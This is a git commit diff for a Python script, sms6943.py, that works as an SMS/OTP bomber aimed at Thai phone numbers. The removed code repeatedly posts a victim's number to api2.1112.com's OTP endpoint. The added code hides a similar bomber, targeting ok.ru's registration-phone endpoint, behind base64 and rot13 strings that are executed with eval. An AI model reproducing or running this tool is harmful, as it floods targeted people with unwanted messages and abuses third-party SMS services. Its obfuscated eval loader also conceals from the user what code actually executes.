2c87f17c6a3201268ff233e10a4fd1e81366199e
phu290 <75463980+phu290@users.noreply.github.com>
2023-09-24 13:39:38 +0700

    sms6943.py

--- sms6943.py
+++ sms6943.py
@@ -1,34 +1,11 @@
-import requests,time
+# Python code obfuscated by www.development-tools.net 
+ 
 
-print("""
-      
-░██████╗███╗░░░███╗░██████╗
-██╔════╝████╗░████║██╔════╝
-╚█████╗░██╔████╔██║╚█████╗░
-░╚═══██╗██║╚██╔╝██║░╚═══██╗
-██████╔╝██║░╚═╝░██║██████╔╝
-╚═════╝░╚═╝░░░░░╚═╝╚═════╝░
-        
-""")
-
-no = input('ตัวอย่าง : 08xx\n[🎭] เบอร์: ')
-jml = int(input('[🎭] จำนวน: '))
-
-heder = {'Host': 'api2.1112.com',
-'content-length': '44',
-'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
-'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
-}
-        
-data = {"phonenumber": f"{no}","language":"th"}
-
-print("\n[กำลังยิง]")
-for i in range(jml):
-      sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
-      if 'eror' in sec.text:
-           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
-      else:
-           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
-      time.sleep(2.0)
-      
-#เครดิตSCK
+import base64, codecs
+magic = 'aW1wb3J0IHJlcXVlc3RzLHRpbWUsb3MsanNvbgpmcm9tIHJlcXVlc3RzIGltcG9ydCBTZXNzaW9uCgppbXBvcnQgc3lzCgoKZGVmIHBob25lKCk6CglzZW5kID0gU2Vzc2lvbigpCglwaG9uZWUgPSBpbnB1dCgi4LmA4Lia4Lit4Lij4LmMID4gIikKCXNlbmQuaGVhZGVycy51cGRhdGUoeyJVc2VyLUFnZW50IiA6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYkt'
+love = 'cqP81ZmphZmLtXRgVIR1ZYPOfnJgyVRqyL2giXFOQnUWioJHiBGHhZP40AwZ4YwH0VSAuMzSlnF81ZmphZmLtEJEaYmx1YwNhZGNlZP4mBPVfVxAioaEyoaDgIUyjMFVtBvNvLKOjoTywLKEco24irP13q3pgMz9loF11pzkyozAiMTIxVvjvDJAwMKO0VvN6VPW0MKu0Y2u0oJjfLKOjoTywLKEco24irTu0oJjerT1fYTSjpTkcL2S0nJ9hY3ugoQgkCGNhBFkcoJSaMF93MJWjYTygLJqyY2SjozpfXv8dB3R9ZP'
+god = '44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45In0pCglzbmQgPSBzZW5kLnBvc3QoImh0dHBzOi8vb2sucnUvZGs/Y21kPUFub255bVJlZ2lzdHJhdGlvbkVudGVyUGhvbmUmc3QuY21kPWFub255bVJlZ2lzdHJhdGlvbkVudGVyUGhvbmUiLGRhdGE9ZiJzdC5yLnBob25lPSs2NntwaG9uZWVbMTpdfSIpCglzZWQgPSBzZW5kLnBvc3QoImh0dHBzOi8vb2sucnUvZGs/Y21kPUFub255b'
+destiny = 'IWyM2ymqUWuqTyioxSwL2IjqRAuoTkIFFMmqP5woJD9LJ5ioaygHzIanKA0pzS0nJ9hDJAwMKO0D2SfoSIWVvkxLKEuCFWmqP5lYzMcMJkxDJAwMKO0D2SfoSIWDaI0qT9hCHAuoTjvXDbWrFN9VTyhpUI0XPYthX3thYKthVUthXCthX3thWethLGthXithXRirFN6VPVcPtycMvNbrFN9CFNvrFVcBtbWPKObo25yXPxXPDxXPDbWMJkmMGbXPDyjpzyhqPNbVxW5MFNuVPVcPtxWPtxWPtbWPaObo25yXPxXPDb='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
